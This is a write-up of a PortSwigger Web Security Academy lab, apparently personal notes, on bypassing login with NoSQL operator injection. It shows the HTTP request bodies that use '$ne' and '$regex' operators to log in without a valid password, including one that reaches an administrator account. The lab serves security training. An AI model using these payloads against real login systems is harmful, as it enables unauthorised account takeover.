# (Exploiting NoSQL operator injection to bypass authentication)[https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication]

> solve the lab with NoSQL operator injection

- open the lab in burp browser
- log in with `wiener:peter`
- check HTML history
- the `/login` request has the credentials in JSON
- this one will be manipulated

```
POST /login HTTP/2
...
{"username":"wiener","password":"peter"}
```

## test in the repeater

> `{"$ne": ""}`

- log out
- turn the intercept on
- try to log in with any credentials
- change the JSON to the following

```
POST /login HTTP/2
...
{ "username": "wiener", "password": { "$ne": "" } }
```

- this let you log in too

> `{"$regex": "wien.*"}`

- log out
- turn the intercept on
- try to log in with any credentials
- change the JSON to the following

```
POST /login HTTP/2
...
{ "username": { "$regex": "wien.*" }, "password": "peter" }
```

- this let you log in too

> `{"$ne":""}` for both

- log out
- turn the intercept on
- try to log in with any credentials
- change the JSON to the following

```
POST /login HTTP/2
...
{ "username": { "$ne": "" }, "password": { "$ne": "" } }
```

- this time the query to return an unexpected number of records
- this indicates that more than one user has been selected

> `{"$regex":"admin.*"}`

- log out
- turn the intercept on
- try to log in with any credentials
- change the JSON to the following

```
POST /login HTTP/2
...
{ "username": { "$regex": "admin.*" }, "password": { "$ne": "" } }
```

- this will let you log in as some kind of administrator
